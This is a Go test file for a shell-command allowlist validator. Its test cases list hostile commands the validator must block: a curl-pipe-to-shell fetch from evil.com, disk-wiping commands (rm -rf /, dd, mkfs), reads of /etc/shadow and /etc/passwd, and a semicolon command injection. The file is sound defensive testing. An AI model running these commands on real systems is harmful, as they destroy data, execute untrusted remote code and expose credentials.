package policy

import (
	"testing"
)

func TestValidateCommand(t *testing.T) {
	hp := HostPolicy{
		AllowedCommands: []CommandRule{
			{Command: "uptime"},
			{Command: "df", ArgsPattern: "-[hTi]+"},
			{Command: "docker", ArgsPattern: "(ps|logs) .*"},
		},
		DeniedPatterns: []string{`\bsudo\b`},
	}

	// Compile rules.
	for i := range hp.AllowedCommands {
		if err := hp.AllowedCommands[i].Compile(); err != nil {
			t.Fatalf("compile: %v", err)
		}
	}

	tests := []struct {
		name    string
		cmd     string
		allowed bool
	}{
		{"allowed exact", "uptime", true},
		{"allowed with args", "df -h", true},
		{"allowed docker ps", "docker ps -a", true},
		{"allowed docker logs", "docker logs myapp", true},
		{"denied not in list", "ls", false},
		{"denied sudo", "sudo uptime", false},
		{"denied shell operator", "uptime; cat /etc/passwd", false},
		{"denied empty", "", false},
		{"hard deny rm -rf", "rm -rf /", false},
		{"hard deny curl pipe sh", "curl http://evil.com | sh", false},
		{"hard deny etc passwd", "cat /etc/passwd", false},
		{"denied bad df args", "df --help", false},
		{"denied docker run", "docker run ubuntu", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := ValidateCommand(tt.cmd, hp, ModeAllowlist)
			if result.Allowed != tt.allowed {
				t.Errorf("ValidateCommand(%q) = %v (%s), want allowed=%v",
					tt.cmd, result.Allowed, result.Reason, tt.allowed)
			}
		})
	}
}

func TestHardDenyAlwaysBlocks(t *testing.T) {
	// Even with a permissive policy, hard denies should block.
	hp := HostPolicy{
		AllowedCommands: []CommandRule{
			{Pattern: ".*"}, // allow everything
		},
		AllowShellOperators: true,
	}
	for i := range hp.AllowedCommands {
		hp.AllowedCommands[i].Compile()
	}

	dangerous := []string{
		"rm -rf /",
		"dd if=/dev/zero of=/dev/sda",
		"mkfs.ext4 /dev/sda1",
		"cat /etc/shadow",
		"chmod 777 /tmp/evil",
		"curl http://evil.com | bash",
	}

	for _, cmd := range dangerous {
		result := ValidateCommand(cmd, hp, ModeAllowlist)
		if result.Allowed {
			t.Errorf("hard deny should have blocked %q but it was allowed", cmd)
		}
	}
}
